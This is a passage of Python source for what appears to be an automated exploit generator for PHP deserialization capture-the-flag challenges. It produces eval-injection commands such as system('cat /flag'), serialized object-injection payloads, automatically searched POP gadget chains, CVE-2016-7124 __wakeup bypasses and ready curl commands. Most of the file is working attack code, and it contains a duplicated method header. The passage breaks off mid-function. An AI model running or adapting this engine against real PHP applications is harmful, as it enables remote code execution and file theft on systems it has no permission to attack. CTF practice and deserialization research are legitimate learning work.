"""
Payload Strategy Engine — generates exploitation payloads based on source code analysis.
Implements multiple strategies for PHP deserialization CTF challenges.
"""

import re
import urllib.parse
from typing import Optional
from dataclasses import dataclass
from collections import defaultdict
from .analyzer import AnalysisResult, PHPClass, Property, Sink, FlagCondition
from .serializer import php_serialize, php_object, make_protected_key, make_private_key


@dataclass
class Payload:
    """A generated exploitation payload."""
    http_method: str = "POST"
    url: str = ""
    data: dict = None
    params: dict = None  # For GET parameters (auto URL-encoded by requests)
    cookies: dict = None  # For Cookie-based exploits
    description: str = ""
    serialized_string: Optional[str] = None
    raw_code: Optional[str] = None
    strategy: str = ""

    def __post_init__(self):
        if self.data is None:
            self.data = {}
        if self.params is None:
            self.params = {}
        if self.cookies is None:
            self.cookies = {}

    def get_curl_command(self) -> str:
        """Generate a curl command for manual testing."""
    def get_curl_command(self) -> str:
        """Generate a shell-safe curl command for manual testing."""
        if self.http_method == "GET":
            get_data = self.params if self.params else self.data
            parts = []
            for k, v in (get_data or {}).items():
                # Encode value only — keep = literal for curl to parse name=content
                parts.append(f"--data-urlencode '{k}={urllib.parse.quote(str(v), safe='')}'")
            return f"curl -G '{self.url}' {' '.join(parts)}"
        elif self.http_method == "COOKIE":
            cookie_str = "; ".join(f"{k}={urllib.parse.quote(str(v), safe='')}" for k, v in (self.cookies or self.data or {}).items())
            return f"curl '{self.url}' -b '{cookie_str}'"
        else:
            data_str = "&".join(f"{k}={urllib.parse.quote(str(v), safe='')}" for k, v in (self.data or {}).items())
            return f"curl -X POST '{self.url}' -d '{data_str}'"


class PayloadGenerator:
    """Generate exploitation payloads based on analysis results."""

    FLAG_INCLUDE_CODE = "include 'flag.php'; echo isset($flag) ? $flag : 'no_flag';"
    SYSTEM_CAT_FLAG = "system('cat /flag');"
    SYSTEM_CAT_FLAG_PHP = "system('cat flag.php');"
    SYSTEM_TAC_FLAG = "system('tac flag.php');"

    # Property names that should carry RCE payloads
    RCE_PROPERTY_NAMES = {
        'act', 'cmd', 'comm', 'code', 'command', 'data', 'payload',
        'flag_command', 'shell', 'exec', 'run', 'action', 'callback',
    }
    # Property names that should hold filenames
    FILE_PROPERTY_NAMES = {'file', 'filename', 'path', 'include', 'target', 'source'}
    # Property names for authentication bypass
    AUTH_PROPERTY_NAMES = {'user', 'username', 'pass', 'password', 'key', 'token'}

    def generate(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate all applicable payloads for the analyzed source."""
        payloads = []

        strategy = analysis.strategy
        if not strategy or strategy == 'unknown':
            strategy = self._guess_strategy(analysis)

        # Always try known POP chain patterns when there are multiple classes
        if len(analysis.classes) >= 2:
            known_pop = self._gen_known_pop_chains(analysis)
            if known_pop:
                payloads.extend(known_pop)

        # Level 5 detection: multiple serialized inputs (o, s, a, i, b, n)
        if len(analysis.inputs) >= 4 and all(
            i.method == 'POST' for i in analysis.inputs
        ):
            payloads.append(self._gen_level5_payload(analysis))

        # Level 5/6 detection: preg_match filter bypass needed
        if re.search(r'preg_match.*\[oc\].*\\d', analysis.raw_source, re.IGNORECASE):
            payloads.extend(self._gen_pregmatch_bypass(analysis))

        # Strategy dispatch
        if strategy == "eval_injection":
            payloads.extend(self._gen_eval_injection(analysis))
        elif strategy == "unserialize_injection":
            payloads.extend(self._gen_unserialize_injection(analysis))
        elif strategy == "unserialize_wakeup":
            payloads.extend(self._gen_unserialize_wakeup(analysis))
        elif strategy == "unserialize_destruct":
            payloads.extend(self._gen_unserialize_destruct(analysis))
        elif strategy == "unserialize_wakeup_destruct":
            payloads.extend(self._gen_unserialize_wakeup_destruct(analysis))
        elif strategy == "unserialize_toString":
            payloads.extend(self._gen_unserialize_toString(analysis))
        elif strategy == "unserialize_invoke":
            payloads.extend(self._gen_unserialize_invoke(analysis))
        elif strategy == "pop_chain":
            payloads.extend(self._gen_pop_chain(analysis))
        elif strategy == "wakeup_bypass":
            payloads.extend(self._gen_wakeup_bypass(analysis))
        elif strategy == "string_escape":
            payloads.extend(self._gen_string_escape(analysis))
        else:
            # Try multiple strategies
            payloads.extend(self._gen_eval_injection(analysis))
            payloads.extend(self._gen_unserialize_injection(analysis))
            payloads.extend(self._gen_unserialize_wakeup(analysis))
            payloads.extend(self._gen_unserialize_destruct(analysis))
            payloads.extend(self._gen_wakeup_bypass(analysis))
            # Always try known POP chains as fallback
            known_pop = self._gen_known_pop_chains(analysis)
            if known_pop:
                payloads.extend(known_pop)

        return payloads

    def _guess_strategy(self, analysis: AnalysisResult) -> str:
        """Try harder to guess strategy when auto-detect fails."""
        source = analysis.raw_source

        if re.search(r'eval\s*\(\s*\$_(?:POST|GET)', source):
            return "eval_injection"
        if re.search(r'unserialize\s*\(\s*\$_(?:POST|GET)', source):
            return "unserialize_injection"
        if re.search(r'__wakeup', source):
            return "unserialize_wakeup"
        if re.search(r'__destruct', source):
            return "unserialize_destruct"

        return "eval_injection"  # default fallback

    # ─── Strategy Implementations ───

    def _gen_eval_injection(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate eval() code injection payloads.
        Target: POST/GET param that feeds into eval().
        """
        payloads = []
        eval_inputs = [i for i in analysis.inputs if i.used_in_eval]

        # If no specific eval input found, try any POST parameter
        if not eval_inputs:
            eval_inputs = [i for i in analysis.inputs if i.method == 'POST']

        if not eval_inputs:
            # Try common parameter names
            eval_inputs = [
                type('Input', (), {'name': 'code', 'method': 'POST'})(),
                type('Input', (), {'name': 'o', 'method': 'POST'})(),
            ]

        source = analysis.raw_source
        classes = {c.name: c for c in analysis.classes}

        for inp in eval_inputs:
            param_name = inp.name

            # Check what classes exist and what they do
            code_options = []

            # If there's a class with __construct that echoes flag
            for cls in analysis.classes:
                has_construct = any(m.name == '__construct' for m in cls.methods)
                has_flag_prop = any(
                    p.default_value and 'flag' in self._safe_str(p.default_value).lower()
                    for p in cls.properties
                )
                if has_construct:
                    code_options.append(f"new {cls.name}();")
                    code_options.append(f"$o=new {cls.name}();")

                # Check if there's a method that includes flag.php
                for method in cls.methods:
                    if 'include' in method.body and 'flag' in method.body:
                        code_options.append(f"(new {cls.name}())->{method.name}();")

                # Check if there are property values that form a flag
                for prop in cls.properties:
                    if prop.default_value and re.search(r'[Hh]ello[Cc][Tt][Ff]\{', str(prop.default_value)):
                        code_options.append(f"echo (new {cls.name}())->{prop.name};")

            # Generic code injection to read flag files
            code_options.extend([
                "system('cat /flag');",
                "system('cat flag.php');",
                "system('tac flag.php');",
                "system('cat ../../flag');",
                "echo file_get_contents('flag.php');",
                "echo file_get_contents('/flag');",
                "highlight_file('flag.php');",
                "show_source('flag.php');",
                "include 'flag.php'; echo $flag;",
                "print_r(scandir('.'));",
                "print_r(scandir('/'));",
            ])

            # Level-specific detections
            # Level 1: requires "new" substring
            if 'stripos' in source and 'new' in source.lower():
                code_options = [c for c in code_options if 'new' in c.lower()]

            # Level 2: $flag_string as global variable
            if 'flag_string' in source:
                code_options.insert(0, '$target->free_flag=$flag_string;')

            # Level 3: multiple properties with flag parts
            if re.search(r'public_flag.*protected_flag.*private_flag', source, re.DOTALL):
                code_options.insert(0, 'echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();')

            # Level 4: private properties, use serialize
            if all(p.visibility == 'private' for p in analysis.classes[0].properties) if analysis.classes else False:
                code_options.insert(0, 'echo serialize($flag_is_here);')

            # Level 8: GC/destruct counter
            if 'construct_flag' in source and 'destruct_flag' in source:
                # Need to increment destruct count to > 5
                code_options.insert(0,
                    'unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));'
                )

            # Level 13: __toString
            if any('__tostring' in m.name for c in analysis.classes for m in c.methods):
                code_options.insert(0, 'echo $obj;')

            # Level 14: __invoke
            if any('__invoke' in m.name for c in analysis.classes for m in c.methods):
                code_options.insert(0, "$obj('get_flag');")

            for code in code_options:
                data = {param_name: code}
                payloads.append(Payload(
                    http_method="POST",
                    data=data,
                    description=f"eval injection: {code[:80]}",
                    raw_code=code,
                    strategy="eval_injection",
                ))

        return payloads

    def _safe_str(self, val) -> str:
        """Convert property default value to string safely. Handles bool, None, str."""
        if val is None: return ""
        if isinstance(val, bool): return "true" if val else "false"
        if isinstance(val, (int, float)): return str(val)
        return str(val) if val else ""

    def _safe_strip(self, val) -> str:
        """Strip quotes from default value, handling non-string types."""
        s = self._safe_str(val)
        return s.strip('"').strip("'")

    def _gen_unserialize_injection(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate unserialize() object injection payloads.
        Target: POST/GET/COOKIE param that feeds into unserialize().
        """
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)
        conditions = self._parse_conditions(analysis)

        # For each target class, generate serialized payload
        for cls in analysis.classes:
            props = {}
            for prop in cls.properties:
                key = self._get_property_key(prop)
                dv = prop.default_value  # keep original type (bool, str, None)

                if prop.name in conditions:
                    props[key] = conditions[prop.name]
                elif prop.name.lower() in self.RCE_PROPERTY_NAMES:
                    props[key] = self.SYSTEM_CAT_FLAG
                elif prop.name.lower() in self.FILE_PROPERTY_NAMES:
                    props[key] = 'flag.php'
                elif prop.name.lower() in self.AUTH_PROPERTY_NAMES:
                    props[key] = dv if dv is not None else 'admin'
                elif 'flag' in prop.name.lower():
                    props[key] = dv if dv is not None else 'flag.php'
                elif 'key' in prop.name.lower():
                    props[key] = "GET_FLAG"
                elif dv is not None:
                    props[key] = dv  # keep bool/int/str as-is
                else:
                    props[key] = "test"

            if not props and cls.name:
                # Empty class — still useful for wakeup triggers
                obj = php_object(cls.name)
                serialized = php_serialize(obj)

                for inp in unserialize_inputs:
                    data = {inp.name: serialized}
                    payloads.append(Payload(
                        http_method=inp.method,
                        data=data,
                        description=f"unserialize {cls.name} (empty, trigger __wakeup)",
                        serialized_string=serialized,
                        strategy="unserialize_injection",
                    ))
                continue

            obj = php_object(cls.name, **props)
            serialized = php_serialize(obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description=f"unserialize {cls.name} with {len(props)} properties",
                    serialized_string=serialized,
                    strategy="unserialize_injection",
                ))

        return payloads

    def _gen_unserialize_wakeup(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate payloads targeting __wakeup() magic method."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)

        for cls in analysis.classes:
            has_wakeup = any(m.name == '__wakeup' for m in cls.methods)
            if not has_wakeup:
                continue

            # For classes with __wakeup, just trigger it
            obj = php_object(cls.name)
            serialized = php_serialize(obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description=f"trigger __wakeup on {cls.name}",
                    serialized_string=serialized,
                    strategy="unserialize_wakeup",
                ))

        return payloads

    def _gen_unserialize_destruct(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate payloads targeting __destruct() magic method."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)
        conditions = self._parse_conditions(analysis)

        # Try heuristic POP chain first for multi-class destruct scenarios
        if len(analysis.classes) >= 2:
            chain = self._build_heuristic_chain(analysis)
            if chain:
                for inp in unserialize_inputs:
                    p = Payload(http_method=inp.method,
                        description=f"Heuristic POP: {' → '.join(chain['names'])}",
                        serialized_string=chain['serialized'], strategy="pop_chain")
                    if inp.method == 'GET': p.params = {inp.name: chain['serialized']}
                    elif inp.method == 'COOKIE': p.cookies = {inp.name: chain['serialized']}
                    else: p.data = {inp.name: chain['serialized']}
                    payloads.append(p)
                return payloads

        for cls in analysis.classes:
            has_destruct = any(m.name == '__destruct' for m in cls.methods)
            if not has_destruct:
                continue

            # Check destruct body for eval or other sinks
            destruct_method = next(
                (m for m in cls.methods if m.name == '__destruct'), None
            )

            props = {}
            for prop in cls.properties:
                key = self._get_property_key(prop)
                dv = prop.default_value
                if prop.name in conditions:
                    props[key] = conditions[prop.name]
                elif prop.name.lower() in self.RCE_PROPERTY_NAMES:
                    props[key] = self.SYSTEM_CAT_FLAG
                elif prop.name.lower() in self.FILE_PROPERTY_NAMES:
                    props[key] = 'flag.php'
                elif 'flag' in prop.name.lower():
                    props[key] = dv if dv is not None else "FAKEFLAG"
                else:
                    props[key] = dv if dv is not None else ""

            obj = php_object(cls.name, **props)
            serialized = php_serialize(obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description=f"trigger __destruct on {cls.name}",
                    serialized_string=serialized,
                    strategy="unserialize_destruct",
                ))

        return payloads

    def _gen_unserialize_wakeup_destruct(self, analysis: AnalysisResult) -> list[Payload]:
        """For classes with both __wakeup and __destruct (CVE-2016-7124 candidate)."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)

        for cls in analysis.classes:
            has_wakeup = any(m.name == '__wakeup' for m in cls.methods)
            has_destruct = any(m.name == '__destruct' for m in cls.methods)

            if not (has_wakeup and has_destruct):
                continue

            # Check if __wakeup has destructive behavior
            wakeup_method = next(
                (m for m in cls.methods if m.name == '__wakeup'), None
            )
            if wakeup_method and ('NULL' in wakeup_method.body or 'unset' in wakeup_method.body):
                # CVE-2016-7124: inflate property count to skip __wakeup
                props = {}
                for prop in cls.properties:
                    key = self._get_property_key(prop)
                    props[key] = prop.default_value if prop.default_value is not None else "FAKEFLAG"

                obj = php_object(cls.name, **props)
                serialized = php_serialize(obj)

                # Inflate property count (add 1 to skip __wakeup)
                inflated = re.sub(
                    rf'O:{len(cls.name)}:"{cls.name}":(\d+):',
                    rf'O:{len(cls.name)}:"{cls.name}":{len(props) + 1}:',
                    serialized
                )

                for inp in unserialize_inputs:
                    data = {inp.name: inflated}
                    payloads.append(Payload(
                        http_method=inp.method,
                        data=data,
                        description=f"CVE-2016-7124 bypass: inflate property count for {cls.name}",
                        serialized_string=inflated,
                        strategy="wakeup_bypass",
                    ))

            # Also generate normal payload
            props = {}
            for prop in cls.properties:
                key = self._get_property_key(prop)
                props[key] = prop.default_value if prop.default_value is not None else ""

            obj = php_object(cls.name, **props)
            serialized = php_serialize(obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description=f"normal unserialize {cls.name}",
                    serialized_string=serialized,
                    strategy="unserialize_wakeup_destruct",
                ))

        return payloads

    def _gen_unserialize_toString(self, analysis: AnalysisResult) -> list[Payload]:
        """For __toString triggered via unserialize."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)

        for cls in analysis.classes:
            has_tostring = any(m.name == '__tostring' for m in cls.methods)
            if not has_tostring:
                continue

            obj = php_object(cls.name)
            serialized = php_serialize(obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description=f"trigger __toString on {cls.name}",
                    serialized_string=serialized,
                    strategy="unserialize_toString",
                ))

        # Also add eval-based __toString trigger if applicable
        for inp in analysis.inputs:
            if inp.used_in_eval:
                payloads.append(Payload(
                    http_method="POST",
                    data={inp.name: "echo $obj;"},
                    description="eval: echo $obj to trigger __toString",
                    raw_code="echo $obj;",
                    strategy="unserialize_toString",
                ))

        return payloads

    def _gen_unserialize_invoke(self, analysis: AnalysisResult) -> list[Payload]:
        """For __invoke triggered via unserialize."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)

        for cls in analysis.classes:
            has_invoke = any(m.name == '__invoke' for m in cls.methods)
            if not has_invoke:
                continue

            obj = php_object(cls.name)
            serialized = php_serialize(obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description=f"trigger __invoke on {cls.name}",
                    serialized_string=serialized,
                    strategy="unserialize_invoke",
                ))

        # Also add eval-based __invoke trigger
        for inp in analysis.inputs:
            if inp.used_in_eval:
                payloads.append(Payload(
                    http_method="POST",
                    data={inp.name: "$obj('get_flag');"},
                    description="eval: call $obj('get_flag') to trigger __invoke",
                    raw_code="$obj('get_flag');",
                    strategy="unserialize_invoke",
                ))

        return payloads

    def _gen_pop_chain(self, analysis: AnalysisResult) -> list[Payload]:
        """Build POP chains heuristically by analyzing method bodies for cross-class calls."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)
        if not unserialize_inputs:
            return payloads

        # Build heuristic chain
        chain = self._build_heuristic_chain(analysis)
        if chain:
            for inp in unserialize_inputs:
                p = Payload(
                    http_method=inp.method,
                    description=f"Heuristic POP chain: {' → '.join(chain['names'])}",
                    serialized_string=chain['serialized'],
                    strategy="pop_chain",
                )
                if inp.method == 'GET': p.params = {inp.name: chain['serialized']}
                elif inp.method == 'COOKIE': p.cookies = {inp.name: chain['serialized']}
                else: p.data = {inp.name: chain['serialized']}
                payloads.append(p)

        return payloads

    def _build_heuristic_chain(self, analysis: AnalysisResult) -> Optional[dict]:
        """Heuristically build a POP chain from method body analysis.
        For generic property names, tries ALL possible class assignments (exhaustive BFS).
        Returns {'names': [...], 'serialized': '...'} or None."""
        class_map = {c.name: c for c in analysis.classes}
        if len(class_map) < 2:
            return None

        # Step 1: Identify sinks
        sink_methods = {}
        for cls in analysis.classes:
            for method in cls.methods:
                body = method.body
                if any(kw in body for kw in ('eval(', 'system(', 'exec(', 'file_get_contents(', 'include(')):
                    sink_methods[cls.name] = method.name

        # Step 2: Identify entry points
        entry_classes = set()
        for cls in analysis.classes:
            for method in cls.methods:
                if method.is_magic and method.name in ('__destruct', '__wakeup', '__invoke', '__tostring', '__call', '__get'):
                    entry_classes.add(cls.name)

        if not entry_classes or not sink_methods:
            return None

        # Step 3: Build edge graph — for generic props, list ALL possible target classes
        # Edge: (source, prop_name, trigger_type) -> [possible_target_classes]
        edges = defaultdict(list)
        edge_details = {}  # (src, tgt, prop) -> trigger_type
        for cls in analysis.classes:
            for method in cls.methods:
                body = method.body
                for m in re.finditer(r'\$this->(\w+)\s*->\s*(\w+)\s*\(', body):
                    prop = m.group(1)
                    targets = self._guess_all_classes(prop, class_map)
                    for t in targets:
                        edges[(cls.name, prop)].append(t)
                        edge_details[(cls.name, t, prop)] = 'method_call'
                for m in re.finditer(r'\(\s*\$this->(\w+)\s*\)\s*\(', body):
                    prop = m.group(1)
                    targets = self._guess_all_classes(prop, class_map)
                    for t in targets:
                        edges[(cls.name, prop)].append(t)
                        edge_details[(cls.name, t, prop)] = 'invoke'
                for m in re.finditer(r'echo\s+.*\$this->(\w+)', body):
                    prop = m.group(1)
                    targets = self._guess_all_classes(prop, class_map)
                    for t in targets:
                        edges[(cls.name, prop)].append(t)
                        edge_details[(cls.name, t, prop)] = 'toString'
                for m in re.finditer(r'isset\s*\(\s*\$this->(\w+)\s*->', body):
                    prop = m.group(1)
                    targets = self._guess_all_classes(prop, class_map)
                    for t in targets:
                        edges[(cls.name, prop)].append(t)

        if not edges:
            return None

        # Step 4: BFS from each entry class, collecting ALL valid chains (capped)
        from collections import deque
        MAX_DEPTH = 10
        MAX_STATES = 5000
        all_chains = []
        visited_states = set()
        total_states = 0

        for entry in entry_classes:
            entry_cls = class_map.get(entry)
            if not entry_cls: continue
            queue = deque()  # fresh queue for each entry
            for prop_def in entry_cls.properties:
                prop_name = prop_def.name
                if (entry, prop_name) in edges:
                    for tgt in edges[(entry, prop_name)]:
                        if tgt == entry: continue  # skip self-loop
                        state = (entry, frozenset({prop_name: tgt}.items()))
                        if state in visited_states: continue
                        visited_states.add(state)
                        total_states += 1
                        if total_states > MAX_STATES: break
                        queue.append((tgt, [entry, tgt], {prop_name: tgt},
                                       [(entry, tgt, prop_name)]))
                if total_states > MAX_STATES: break
            if total_states > MAX_STATES: break

            while queue and total_states <= MAX_STATES:
                current, path, assignments, used_edges = queue.popleft()
                if len(path) > MAX_DEPTH: continue

                if current in sink_methods:
                    all_chains.append((path, dict(assignments), list(used_edges)))

                cur_cls = class_map.get(current)
                if not cur_cls: continue
                for prop_def in cur_cls.properties:
                    prop_name = prop_def.name
                    if (current, prop_name) in edges:
                        for tgt in edges[(current, prop_name)]:
                            if tgt in path: continue  # avoid revisiting
                            state_key = (current, frozenset({prop_name: tgt}.items()))
                            if state_key in visited_states: continue
                            visited_states.add(state_key)
                            total_states += 1
                            if total_states > MAX_STATES: break
                            new_assignments = dict(assignments)
                            new_assignments[prop_name] = tgt
                            new_used = list(used_edges) + [(current, tgt, prop_name)]
                            queue.append((tgt, path + [tgt], new_assignments, new_used))
                    if total_states > MAX_STATES: break
                if total_states > MAX_STATES: break

        # Pick best chain: shortest + non-redundant (no self-loops)
        if all_chains:
            all_chains.sort(key=lambda x: len(x[0]))
            best_path, best_assignments, best_edges = all_chains[0]
            serialized = self._build_chain_from_assignments(
                best_path, best_assignments, class_map, sink_methods.get(best_path[-1]),
                {e: edge_details.get(e, 'method_call') for e in best_edges}
            )
            if serialized:
                return {'names': best_path, 'serialized': serialized}

        return None

    def _guess_all_classes(self, prop_name: str, class_map: dict) -> list:
        """Return ALL possible class names a property might reference."""
        prop_lower = prop_name.lower()
        results = []
        for cname in class_map:
            if cname.lower() == prop_lower:
                results.append(cname)
        # Partial matches
        for cname in class_map:
            if cname.lower() in prop_lower or prop_lower in cname.lower():
                if cname not in results:
                    results.append(cname)
        # If no match, return ALL classes (generic property like 'obj', 'var')
        if not results:
            results = list(class_map.keys())
        return results

    def _build_chain_from_assignments(self, path: list, assignments: dict,
                                        class_map: dict, sink_method: Optional[str],
                                        edge_types: dict) -> Optional[str]:
        """Build serialized objects from an assignment map."""
        objects = {}
        # Build from last to first
        for name in reversed(path):
            cls = class_map.get(name)
            if not cls:
                continue
            props = {}
            for prop_def in cls.properties:
                key = self._get_property_key(prop_def)
                prop_name = prop_def.name
                if prop_name in assignments and assignments[prop_name] in objects:
                    props[key] = objects[assignments[prop_name]]
                else:
                    props[key] = prop_def.default_value if prop_def.default_value is not None else ""
            # If sink class, set RCE value
            if name == path[-1] and sink_method:
                for prop_def in cls.properties:
                    if prop_def.name.lower() in self.RCE_PROPERTY_NAMES:
                        props[self._get_property_key(prop_def)] = self.SYSTEM_CAT_FLAG
                    elif prop_def.name.lower() in self.FILE_PROPERTY_NAMES:
                        props[self._get_property_key(prop_def)] = 'flag.php'
            obj = php_object(name, **props)
            objects[name] = obj

        if path[0] in objects:
            from engine.serializer import php_serialize_refs
            return php_serialize_refs(objects[path[0]])
        return None

    def _build_chain_from_path(self, chain_names: list, edges: list,
                                 class_map: dict, sink_method: Optional[str]) -> Optional[str]:
        """Build a serialized object chain from a path of class names."""
        if len(chain_names) < 2:
            return None

        # Build edges map for this path
        path_edges = {}
        for i in range(len(chain_names) - 1):
            src = chain_names[i]
            tgt = chain_names[i + 1]
            for e_src, e_tgt, e_type, e_prop in edges:
                if e_src == src and e_tgt == tgt:
                    path_edges[src] = (tgt, e_type, e_prop)
                    break

        # Determine the entry class (first in chain) and build from innermost outward
        # Build objects from last to first
        objects = {}  # name -> dict
        for name in reversed(chain_names):
            cls = class_map.get(name)
            if not cls:
                continue
            props = {}
            for prop_def in cls.properties:
                key = self._get_property_key(prop_def)
                # Check if this property wires to the next class in the chain
                if name in path_edges:
                    tgt, _, tgt_prop = path_edges[name]
                    if tgt_prop == prop_def.name and tgt in objects:
                        props[key] = objects[tgt]
                    else:
                        props[key] = prop_def.default_value if prop_def.default_value is not None else ""
                else:
                    props[key] = prop_def.default_value if prop_def.default_value is not None else ""
            # If this is the sink class, set the sink property value
            if name == chain_names[-1] and sink_method:
                for prop_def in cls.properties:
                    if prop_def.name.lower() in self.RCE_PROPERTY_NAMES:
                        key = self._get_property_key(prop_def)
                        props[key] = self.SYSTEM_CAT_FLAG
                    elif prop_def.name.lower() in self.FILE_PROPERTY_NAMES:
                        key = self._get_property_key(prop_def)
                        props[key] = 'flag.php'
            obj = php_object(name, **props)
            objects[name] = obj

        # Check for shared references: if an object appears as a property value in multiple places,
        # use php_serialize_refs to generate proper r:N; references
        if not objects:
            return None
        entry_name = chain_names[0]
        if entry_name in objects:
            from engine.serializer import php_serialize_refs
            return php_serialize_refs(objects[entry_name])
        return None

    def _gen_known_pop_chains(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate known POP chain payloads for common challenge patterns."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)
        class_names = {c.name for c in analysis.classes}

        # Pattern: Level 15 - D -> destnation -> A -> B -> C (eval via cmd->a->b->c)
        if {'D', 'destnation', 'A', 'B', 'C'}.issubset(class_names):
            c_obj = php_object('C', c="system('cat /flag');")
            b_obj = php_object('B', b=c_obj)
            a_obj = php_object('A', a=b_obj)
            des_obj = php_object('destnation', cmd=a_obj)
            d_obj = php_object('D', d=des_obj)
            serialized = php_serialize(d_obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description="POP chain: D->destnation->A->B->C (Level 15)",
                    serialized_string=serialized,
                    strategy="pop_chain",
                ))

        # Pattern: Level 16 - INIT -> B -> A (__wakeup -> __toString -> __invoke -> include)
        if {'INIT', 'B', 'A'}.issubset(class_names):
            a_obj = php_object('A', a='flag.php')
            b_obj = php_object('B', b=a_obj)
            init_obj = php_object('INIT', name=b_obj)
            serialized = php_serialize(init_obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description="POP chain: INIT->B->A (Level 16)",
                    serialized_string=serialized,
                    strategy="pop_chain",
                ))

        # Pattern: Level 17 - A with helloctfcmd property
        if 'A' in class_names:
            a_obj = php_object('A', helloctfcmd='get_flag')
            serialized = php_serialize(a_obj)

            for inp in unserialize_inputs:
                data = {inp.name: serialized}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description="A with helloctfcmd=get_flag (Level 17)",
                    serialized_string=serialized,
                    strategy="pop_chain",
                ))

        # Pattern: BuuCTF UnserializeOne - Start->Sec->Easy->eeee (with r:N; references)
        if {'Start', 'Sec', 'Easy', 'eeee'}.issubset(class_names):
            from engine.serializer import php_serialize_refs
            # Build the chain with references
            start = php_object('Start')
            sec = php_object('Sec')
            easy = php_object('Easy')
            eeee_obj = php_object('eeee')
            # Wire the chain: Start->name=Sec, Start->func=Sec(ref), Sec->obj=Easy, Sec->var=eeee, eeee->obj=Start(ref)
            start['name'] = sec
            start['func'] = sec  # will become r:2; reference
            sec['obj'] = easy
            sec['var'] = eeee_obj
            eeee_obj['obj'] = start  # will become r:1; reference
            easy['cla'] = None
            serialized = php_serialize_refs(start)

            for inp in unserialize_inputs:
                p = Payload(
                    http_method=inp.method,
                    description="POP chain: Start->Sec->Easy->eeee (BuuCTF UnserializeOne)",
                    serialized_string=serialized,
                    strategy="pop_chain",
                )
                if inp.method == 'GET': p.params = {inp.name: serialized}
                elif inp.method == 'COOKIE': p.cookies = {inp.name: serialized}
                else: p.data = {inp.name: serialized}
                payloads.append(p)

        return payloads

    def _gen_wakeup_bypass(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate CVE-2016-7124 __wakeup bypass payloads."""
        payloads = []
        unserialize_inputs = self._get_unserialize_inputs(analysis)

        for cls in analysis.classes:
            has_wakeup = any(m.name == '__wakeup' for m in cls.methods)
            if not has_wakeup:
                continue

            props = {}
            for prop in cls.properties:
                key = self._get_property_key(prop)
                # Set default value if available
                if prop.default_value:
                    props[key] = self._safe_strip(prop.default_value)
                else:
                    props[key] = "FAKEFLAG"

            if not props:
                # Empty class with __wakeup
                obj = php_object(cls.name)
                serialized = php_serialize(obj)
                inflated = re.sub(
                    rf'O:{len(cls.name)}:"{cls.name}":0:',
                    rf'O:{len(cls.name)}:"{cls.name}":1:',
                    serialized
                )
            else:
                obj = php_object(cls.name, **props)
                serialized = php_serialize(obj)
                # Inflate property count
                inflated = re.sub(
                    rf'O:{len(cls.name)}:"{cls.name}":(\d+):',
                    rf'O:{len(cls.name)}:"{cls.name}":{len(props) + 1}:',
                    serialized
                )

            for inp in unserialize_inputs:
                data = {inp.name: inflated}
                payloads.append(Payload(
                    http_method=inp.method,
                    data=data,
                    description=f"CVE-2016-7124: inflated count {len(props)}+1 for {cls.name}",
                    serialized_string=inflated,
                    strategy="wakeup_bypass",
                ))

        return payloads

    def _gen_string_escape(self, analysis: AnalysisResult) -> list[Payload]:
        """Generate string escape payloads (str_replace + serialize + unserialize)."""
        payloads = []

        # Level 18 pattern: GET target[] and change[] parameters
        target_inputs = [i for i in analysis.inputs if i.name in ('target', 'change')]
        if target_inputs:
            payloads.append(Payload(
                http_method="GET",
                params={'target[0]': 'Demo', 'target[1]': '20',
                        'change[0]': 'FLAG', 'change[1]': '8'},
                description="String escape: replace Demo->FLAG, 20->8 (Level 18)",
                strategy="string_escape",
            ))
            return payloads  # Level 18 is specific, don't add generic escapes

        # Detect str_replace patterns (single or array args)
        source = analysis.raw_source
        sr = re.search(
            r"str_replace\s*\(\s*(?:array\(([^)]+)\)|\[([^\]]+)\]|'([^']+)'|\"([^\"]+)\")\s*,\s*(?:array\(([^)]+)\)|\[([^\]]+)\]|'([^']+)'|\"([^\"]+)\")\s*,\s*(\$\w+)",
            source
        )
        if sr:
            # Determine search/replace strings (handle both single and array forms)
            search_raw = sr.group(1) or sr.group(2) or sr.group(3) or sr.group(4) or ""
            replace_raw = sr.group(5) or sr.group(6) or sr.group(7) or sr.group(8) or ""
            # Parse array syntax: strip quotes from each element
            search_parts = [s.strip().strip("'").strip('"') for s in search_raw.split(',') if s.strip()]
            replace_parts = [s.strip().strip("'").strip('"') for s in replace_raw.split(',') if s.strip()]
            if not search_parts: search_parts = [search_raw.strip("'\"")]
            if not replace_parts: replace_parts = [replace_raw.strip("'\"")]
            # Use first pair for delta calculation (or min delta for multi)
            search_str = search_parts[0]
